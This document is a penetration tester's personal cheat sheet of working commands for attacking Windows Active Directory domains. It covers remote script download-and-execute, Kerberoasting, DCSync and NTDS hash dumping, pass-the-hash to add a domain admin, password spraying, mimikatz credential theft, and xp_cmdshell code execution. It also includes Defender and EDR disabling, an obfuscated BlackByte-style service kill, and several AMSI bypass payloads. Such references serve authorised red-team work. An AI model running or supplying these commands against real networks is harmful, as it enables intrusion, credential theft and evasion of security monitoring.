---
description: >-
  This is just a living document of things I have needed for domain
  enumeration/exploitation
---

# Domain Enumeration + Exploitation

## POWERSPLOIT

Use the `dev` branch or [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev). For an already incredible cheat sheet, [check out HarmJ0y's](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993).

{% code overflow="wrap" %}
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')
```
{% endcode %}

### Get Domain Users

{% code overflow="wrap" %}
```powershell
Get-NetUser * -Domain burmat.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset, lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol | Export-CSV users.csv
```
{% endcode %}

### Get Domain Computers

{% code overflow="wrap" %}
```powershell
Get-NetComputer * -Domain corp.local | Select-Object -Property dnshostname,operatingsystem,operatingsystemservicepack,lastlogontimestamp | Export-CSV computers.csv
```
{% endcode %}

### Get Group Members

{% code overflow="wrap" %}
```powershell
Get-DomainGroupMember -Identity "Domain Admins" | Select-Object membername
```
{% endcode %}

### SPN Ticket Request (Kerberoasting)

{% code overflow="wrap" %}
```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\ticket.csv -NoTypeInformation
```
{% endcode %}

### Targeted Kerberoasting

{% code overflow="wrap" %}
```powershell
Get-DomainUser 'victimuser' | Select serviceprincipalname
Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

# Obtain a kerberoast hash to crack
$User = Get-DomainUser 'victimuser'
$User | Get-DomainSPNTicket | fl

# Clear the SPNs of the target account
$User | Select serviceprincipalname
Set-DomainObject -Identity victimuser -Clear serviceprincipalname
```
{% endcode %}

### Enumerate User DACLs

{% code overflow="wrap" %}
```powershell
Get-DomainObjectAcl -Identity it_admin -ResolveGUIDs ? { $_.SecurityIdentifier -Match $(ConvertTo-SID burmat) }
```
{% endcode %}

### Enumerate Network Shares

{% code overflow="wrap" %}
```powershell
## scan an entire domain:
find-domainshare -computerdomain burmat.local

## narrow down scope, check permissions:
find-domainshare -computername websrv.burmat.local -computerdomain burmat.local -CheckShareAccess
```
{% endcode %}

### Impersonate Another Domain User

{% code overflow="wrap" %}
```powershell
$cred = New-Object System.Management.Automation.PSCredential "BURMAT\John.Smith", $(ConvertTo-SecureString "Spring2020!" -AsPlainText -Force);

Find-DomainShare -ComputerName fs01.burmat.local -Credential $cred -ComputerDomain burmat.local -CheckShareAccess

Invoke-UserImpersonation -Credential $cred

# now we can read the directory impersonating another user if permissions exist:
dir \\fs01.burmat.local\Private
```
{% endcode %}

### Enumerate GPO's

{% code overflow="wrap" %}
```powershell
"{7EA15487-7F5B-4CE3-C029-CEBE6FFE6D47}" | Get-DomainGPO
```
{% endcode %}

### Reset Domain User Password

If you own the owner of another AD user object (`WriteOwner`, `WriteDACL`, `GenericWrite`, `Owner`, etc), you can reset the password with ease:

{% code overflow="wrap" %}
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')
$user = 'DOMAIN\owner_acct';
$pass= ConvertTo-SecureString 'Password123!' -AsPlainText -Force;
$creds = New-Object System.Management.Automation.PSCredential $user, $pass;
$newpass = ConvertTo-SecureString 'burmatw@sh3r3' -AsPlainText -Force;
Set-DomainUserPassword -Identity 'DOMAIN\vuln_user' -AccountPassword $newpass -Credential $creds;
```
{% endcode %}

Or if you can set yourself as owner, the following will do:

{% code overflow="wrap" %}
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')
Set-DomainObjectOwner -Identity it_admin -OwnerIdentity burmat
Add-DomainObjectAcl -TargetIdentity it_admin -PrincipalIdentity burmat
$newpass = ConvertTo-SecureString -String 'burmat123$' -AsPlainText -Force
Set-DomainUserPassword -Identity it_admin -AccountPassword $newpass
```
{% endcode %}

Or you can do it using Impacket's "smbpasswd.py", as shown below.

### Add/Exploit DCSync Rights

Do you have `WriteDACL` to a domain? Give DCSync rights to an unprivileged domain user account:

{% code overflow="wrap" %}
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=burmat,DC=local" -PrincipalIdentity jsmith -Rights DCSync
```
{% endcode %}

And use these rights to dump the hashes from the domain:

{% code overflow="wrap" %}
```
meterpreter > dcsync_ntlm burmat.local\\jsmith
```
{% endcode %}

## IMPACKET

Thanks to the [impacket](https://github.com/SecureAuthCorp/impacket) toolset, exploiting misconfigurations in AD environments is made easier.

### GetUserSPNs.py

{% code overflow="wrap" %}
```sh
GetUserSPNs.py -request -dc-ip 10.10.10.123 burmat.local/xsvc:S3cur3PW123
```
{% endcode %}

### GetNPUsers.py

Attempt to get TGTs for users that have `UF_DONT_REQUIRE_PREAUTH` set:

{% code overflow="wrap" %}
```bash
GetNPUsers.py -request -no-pass -dc-ip 10.10.10.123 burmat.local/ -usersfile users.txt
```
{% endcode %}

### secretsdump.py

Attack a local offline copy of NTDS.dit:

{% code overflow="wrap" %}
```bash
secretsdump.py -ntds /root/l00t/ntds.dit -system /root/l00t/systemhive LOCAL
```
{% endcode %}

Or you can attack a system remotely:

{% code overflow="wrap" %}
```bash
secretsdump.py -just-dc-ntlm burmat.local/administrator@10.10.10.123
```
{% endcode %}

### GetADUsers.py

Leverage this script to grab usernames via LDAP

{% code overflow="wrap" %}
```bash
GetADUsers.py -all -no-pass -dc-ip 10.10.10.123 burmat.local/ | cut -d " " -f 1 | grep -Ev 'Name|Impacket|\-\-|\[' >> users.txt
```
{% endcode %}

### smbpasswd.py

Reset a password if you have the credentials but it is expired. Useful if you have a hash and no pw, too.

{% code overflow="wrap" %}
```bash
smbpasswd -r 10.0.0.12 -U 'burmat'
```
{% endcode %}

## NetExec

GitHub repo: [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### Pass-the-Hash

Because hashes are just as good:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">## create a new user
nxc smb 10.10.10.123 -u 'administrator' -d 'burmat.local' -H 'd7452863d1e8e15241nn50ceb1ab9dfe' -x 'net user burmat Pwn3dPwn3d! /add /domain'
<strong>
</strong><strong>## add user to domain admins group
</strong>nxc smb 10.10.10.123 -u 'administrator' -d 'burmat.local' -H 'd7452863d1e8e15241nn50ceb1ab9dfe' -x 'net group "Domain Admins" /add burmat /domain'
</code></pre>

### SMB Password Spraying

Switch out usernames/passwords/targets with lists:

{% code overflow="wrap" %}
```bash
## to spray that Spring2020! and a list of users against a list of targets:
nxc smb 'targets.txt' -u 'users.txt' -p 'Spring2024!' -d 'burmat.local'
```
{% endcode %}

### Dumping Remote PowerShell History

{% code overflow="wrap" %}
```bash
nxc smb 10.250.1.33 -u 'dev001' -p 'burmat123$' -d 'burmat.local' -M powershell_history
```
{% endcode %}

### Extracting Credentials

{% code overflow="wrap" %}
```bash
## mimikatz module
nxc smb 10.10.10.123 -u 'administrator' -d 'burmat.local' -p 'S3cur3PW123' -M mimikatz -o COMMAND='privilege::debug'

## SAM database
nxc smb 10.10.10.123 -u 'administrator' -d 'burmat.local' -p 'S3cur3PW123' --sam
```
{% endcode %}

## POWERUPSQL

GitHub Repo: [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) and more thorough cheat sheet: [https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

### MSSQL Enumeration:

{% code overflow="wrap" %}
```powershell
## basic instance information
Get-SQLInstanceLocal

## more verbose information:
Get-SQLServerInfo -Verbose -Instance SQLSRV\SQLEXPRESS

## crawl for databse links:
Get-SqlServerLinkCrawl -Verbose -Instance SQLSRV\SQLEXPRESS
```
{% endcode %}

### Execute DB Query via MSSQL Link

{% code overflow="wrap" %}
```powershell
Get-SqlServerLinkCrawl -Verbose -Instance SQLSRV\SQLEXPRESS -Query "select name from master..sysdatabases" | Select-Object -ExpandProperty CustomQuery
```
{% endcode %}

### Enable xp\_cmdshell / Execute Commands

{% code overflow="wrap" %}
```powershell
## enable xp_cmdshell:
Get-SQLQuery -Instance SQLSRV\SQLEXPRESS -query "EXECUTE('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT ""sqlsrv.burmat.local"""

## test rce:
Get-SQLServerLinkCrawl -Instance "SQLSRV\SQLEXPRESS" -Query "exec master..xp_cmdshell 'whoami'" | Select-Object -ExpandProperty CustomQuery
```
{% endcode %}

## KERBEROS

### Brute Usernames with Nmap

{% code overflow="wrap" %}
```bash
nmap -v -Pn -p 88 --script krb5-enum-users.nse --script-args "realm='burmat.local', userdb='users.txt'" 10.10.10.123
```
{% endcode %}

### GenericWrite to Host + User SPN = PWN

If we have `GenericWrite` privileges over a host and we are a user that has an SPN, we can write our SID to the `msDS-AllowedToActOnBehalfOfOtherIdentity` property against the AD object and forge tickets as anyone we like. You can read more about it here: [https://alsid.com/company/news/kerberos-resource-based-constrained-delegation-new-control-path](https://alsid.com/company/news/kerberos-resource-based-constrained-delegation-new-control-path)

{% code overflow="wrap" %}
```powershell
## we can write our delegation attribute to the DC with the following:
$UserSid = Get-DomainUser svc_burmat -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($UserSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer websrv.burmat.local | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

## use rubeus to forge tickets as administrator accounts
rubeus.exe s4u /user:svc_burmat /ticket:doIFFDCCBRCg..SNIP.. /impersonateuser:administrator /msdsspn:cifs/websvr.burmat.local /ptt
```
{% endcode %}

### Setting an SPN

#### With `setspn.exe`:

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>setspn -s MSSQLSvc/USER-PC01.burmat.local burmat.local\svc-mssql 
</strong>setspn -L burmat.local\svc-mssql
# remove with:
setspn -d MSSQLSvc/USER-PC01.burmat.local burmat.local\svc-mssql
</code></pre>

#### With the PowerShell `ActiveDirectory` module:

{% code overflow="wrap" %}
```powershell
Set-ADUser -Identity svc-mssql -ServicePrincipalNames @{Add='MSSQLSvc/USER-PC01.burmat.local','host/USER-PC01.burmat.local'}
# clear them out with
Set-ADUser -Identity svc-mssql -ServicePrincipalNames $Null
```
{% endcode %}

### Listing SPNs

#### Using `ldifde`

{% code overflow="wrap" %}
```powershell
ldifde -d "DC=burmat,DC=local" -l ServicePrincipalName -F C:\SPNs.txt
```
{% endcode %}

#### Using the PowerShell Module `ActiveDirectory`

{% code overflow="wrap" %}
```powershell
Get-ADComputer -Filter * -Properties ServicePrincipalNames | Select-Object -ExpandProperty ServicePrincipalNames

Get-ADUser -Filter * -Properties ServicePrincipalNames | Select-Object -ExpandProperty ServicePrincipalNames
```
{% endcode %}

#### With `DirectorySearcher`

{% code overflow="wrap" %}
```powershell
$s = New-Object DirectoryServices.DirectorySearcher([ADSI]"");
$s.PageSize = 2000; 
$s.Filter = "(servicePrincipalName=*)" 
$s.FindAll()
```
{% endcode %}

#### Using `ldapsearch`

<mark style="background-color:red;">\[TODO]</mark>

### Creating a Keytab

{% code overflow="wrap" %}
```powershell
ktpass /princ wsman/svc-mssql@burmat.local /mapuser svc-mssql@burmat.local /pass "S3cur3PW123" /out svc-mssql.keytab /crypto all /ptype KRB5_NT_PRINCIPAL /mapop set
```
{% endcode %}

### Kerberoasting:

#### Rubeus

{% code overflow="wrap" %}
```powershell
rubeus.exe kerberoast /creduser:burmat.local\xsvc /credpassword:S3cur3PW123 /outfile:user.hash
```
{% endcode %}

#### PowerView.ps1

```sh
[TODO]
```

### Attacking spoolss  ("The Printer Bug")

From a host with unconstrained delegation, "[the printer bug](https://www.slideshare.net/harmj0y/the-unintended-risks-of-trusting-active-directory)" and [dementor.py](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc) can be used to cause a TGT relay from the target host to us running responder, so we can generate a TGS for any user on that target host:

{% code overflow="wrap" %}
```sh
## set up a relay with responder:
responder -I tun0 --lm # tun0 = 10.10.15.123

## execute exploit through:
proxychains python dementor.py -u xsvc -p 'S3cur3PW123' -d 'burmat.local' 10.10.15.123 10.10.10.123
```
{% endcode %}

## BLOODHOUND

### Ingestor Launch

{% code overflow="wrap" %}
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.123/ps/SharpHound.ps1');
Invoke-BloodHound -CollectionMethod All -CompressData -SkipPing;
```
{% endcode %}

## LDAP ENUMERATION

### Null Sessions

{% code overflow="wrap" %}
```sh
ldapsearch -x -h 10.10.10.123 -D '' -w '' -b "DC=BURMAT,DC=LOCAL"
```
{% endcode %}

### Queries

Below are some useful LDAP queries that will help you enumerate a system. Some of them require a valid username/password to get more information. My go-to for these queries is `ldapsearch`.&#x20;

Use the following command and fill in your LDAP query in the placeholder:

{% code overflow="wrap" %}
```bash
ldapsearch -LLL -x -H ldap://burmat.local -D "svc-burmat" -w "burmat123$" -b "dc=burmat,dc=LOCAL" "<LDAP QUERY HERE>"
```
{% endcode %}

#### Domain Usernames

Get usernames into a list by enumerating user objects:

{% code overflow="wrap" %}
```bash
ldapsearch -x -h burmat.local -b "dc=burmat,dc=local" -s sub "(objectclass=user)" | grep sAMAccountName | cut -d " " -f 2 > users.txt
```
{% endcode %}

#### ASREPRoast Accounts

```
## ldap filter to find accounts susceptible to this:
"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"

## generate a list of user accounts and use impacket to exploit:

## and if you get a ticket, you can crack it:
hashcat -m 18200 -a 0 --force user.hash /usr/share/wordlists/rockyou.txt
```

#### Users with SPNs

<pre class="language-powershell"><code class="lang-powershell">"(&#x26;(&#x26;(servicePrincipalName=*) (UserAccountControl:1.2.840.113556.1.4.803:=512)) (!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
<strong>
</strong>## if you get valid domain credentials, you can dump them w/ impacket for offline cracking:
python GetUserSPNs.py -request burmat.local/svc-burmat:burmat123$
</code></pre>

#### User and Computers with Unconstrained Delegation

```powershell
# user:
"(&(&(objectCategory=person) (objectClass=user)) (userAccountControl:1.2.840.113556.1.4.803:=524288))"

# computer:
"(&(objectCategory=computer) (objectClass=computer) (userAccountControl:1.2.840.113556.1.4.803:=524288))"
```

#### Domain Administrators

```powershell
"(&(objectClass=user) (memberof:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=burmat,DC=local))" "objectClass=groupPolicyContainer"
```

## ENDPOINT PROTECTION

### Endpoint Detection & Response (EDR)

#### Checking Status

{% code overflow="wrap" %}
```powershell
Get-MpComputerStatus
```
{% endcode %}

#### Adding Exclusion

{% code overflow="wrap" %}
```powershell
Add-MpPreference -ExclusionPath 'C:\windows\temp'
```
{% endcode %}

#### Scanning a File with Defender

{% code overflow="wrap" %}
```powershell
C:\Program Files\Windows Defender\MpCmdRun.exe -Scan -ScanType 3 -DisableRemediation -File 'C:\stager.exe'
```
{% endcode %}

#### Disabling Defender

{% code overflow="wrap" %}
```powershell
taskkill  /F /IM MSASCuiL.exe

Set-MpPreference -DisableIntrusionPreventionSystem $true `
-DisableRealtimeMonitoring $true -DisableScriptScanning $true `
-EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode `
-Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend

REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d 0x1 /f
REG ADD "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "DisableNotificationCenter" /t REG_DWORD /d 0x1 /f
REG DELETE "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "AllowFastServiceStartup" /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "LocalSettingOverrideSpynetReporting" /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 0x2 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v "NotificationSuppress" /t REG_DWORD /d 0x1 /f

```
{% endcode %}

####

####

####

#### Disable Defender on Reboot (A BlackByte TTP)

{% code overflow="wrap" %}
```powershell
powershell -command "$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA'+'G4ARA B'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType Disabled $x"
```
{% endcode %}

#### Checking AppLocker

{% code overflow="wrap" %}
```powershell
$a = Get-ApplockerPolicy -effective; $a.rulecollections;
```
{% endcode %}

You can also review the AppLocker policies by enumerating the Registry manually:

{% code overflow="wrap" %}
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s
reg query "HKEY_LOCAL_Machine\Software\Policies\Microsoft\Windows\SrpV2" /s
```
{% endcode %}

#### Language Mode

{% code overflow="wrap" %}
```powershell
$ExecutionContext.SessionState.LanguageMode
```
{% endcode %}

#### Nested PowerShell Bypass

{% code overflow="wrap" %}
```powershell
powershell.exe -enc [BASE64THIS(powershell.exe -w hidden -c "iex(...)"]>
```
{% endcode %}

#### 32-Bit PowerShell Bypass

PowerShell disabled for you? Try running the 32-bit copy of it:&#x20;

{% code overflow="wrap" %}
```sh
C:\windows\syswow64\windowspowershell\v1.0\powershell whoami
```
{% endcode %}

#### Default Writable Folders for Execution Control Bypass

Try putting your payload in one of the following directories:

{% code overflow="wrap" %}
```powershell
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing 
```
{% endcode %}

#### Blocking MS Defender Connections

{% hint style="warning" %}
Events are cached on the system, so as soon as traffic is established again, the floodgates will open.
{% endhint %}

{% code overflow="wrap" %}
```powershell
New-NetFirewallRule -DisplayName "Block 443 MsMpEng" -Name "Block 443 MsMpEng" -Direction Outbound -Service WinDefend -Enabled True -RemotePort 443 -Protocol TCP -Action Block

New-NetFirewallRule -DisplayName "Block 443 SenseCncProxy" -Name "Block 443 SenseCncProxy" -Direction Outbound -Program "%ProgramFiles%\Windows Defender Advanced Threat Protection\SenseCncProxy.exe" -RemotePort 443 -Protocol TCP -Action Block

New-NetFirewallRule -DisplayName "Block 443 MsSense" -Name "Block 443 MsSense" -Direction Outbound -Program "%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe" -RemotePort 443 -Protocol TCP -Action Block
```
{% endcode %}

### AMSI Bypasses

{% hint style="info" %}
A classic resource: [https://amsi.fail/](https://amsi.fail/)
{% endhint %}

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
SeT-Item ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( TYpE ) ; ( Get-varIABLE ( ('1Q'+'2U') +'zX' ) -VaL )."AssEmbly"."GETTYPe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."getfiElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sETVaLUE"( ${nULl},${tRuE} );
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
$fzxhw = @" using System; using System.Runtime.InteropServices; public class fzxhw { [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name); [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr vilqbn, uint flNewProtect, out uint lpflOldProtect); } "@
Add-Type $fzxhw
$jvdnuxs = [fzxhw]::LoadLibrary("$(('ämsî'+'.dll').NORMALiZE(chAr+ChaR+ChAr+CHar+cHar) -replace ChAr+ChAR+cHAR+ChaR+chAr+CHar)") $ikbtnz = [fzxhw]::GetProcAddress($jvdnuxs, "$(cHAR+Char+chaR+cHAr+ChAr+Char+cHaR+chAR+chAr+cHAr+CHar+cHaR+CHaR+CHar)") $p = 0 [fzxhw]::VirtualProtect($ikbtnz, [uint32]5, 0x40, [ref]$p) $ovsj = "0xB8" $zahw = "0x57" $cfuu = "0x00" $ukxu = "0x07" $salu = "0x80" $yrkl = "0xC3" $xrnun = [Byte[]] ($ovsj,$zahw,$cfuu,$ukxu,+$salu,+$yrkl) [System.Runtime.InteropServices.Marshal]::Copy($xrnun, 0, $ikbtnz, 6)
```
{% endcode %}

## PROCESS ELEVATION (via SeDebugPrivilege)

If you run `whoami /priv` and you see `SeDebugPrivilege` set to `Enabled`, you can assume you already have SYSTEM. &#x20;

One way of doing it, is using [decoder](https://twitter.com/decoder\_it)'s `psgetsys.ps1` [script](https://github.com/decoder-it/psgetsystem) once you have a good idea on a PID to inject:  `. .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(7864, 'C:\temp\burmat443.exe');`

You can also gain a MSF session and use the module `windows/manage/payload_inject` with a PID of your choice.

## REMOTE DESKTOP

### Enable RDP

PowerShell

```powershell
Set-itemproperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -value 0
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\' -Name "UserAuthentication" -value 1
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

Windows Commands

```powershell
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh advfirewall set rule group="remote administration" new enable="yes"
netsh advfirewall firewall set rule group="remote administration" new enable=yes
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=domain
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=private
netsh firewall add portopening TCP 3389 "Remote Desktop"
netsh firewall set service RemoteDesktop enable
netsh firewall set service RemoteDesktop enable profile=ALL
netsh firewall set service RemoteAdmin enable
sc config TermService start= auto
net start Termservice
```

## MISCELLANEOUS&#x20;

```powershell
# list shared folders
Get-WmiObject -Class Win32_Share -Computer dc1.burmat.local

## get .NET versions installed:
dir C:\Windows\Microsoft.NET\Framework
```
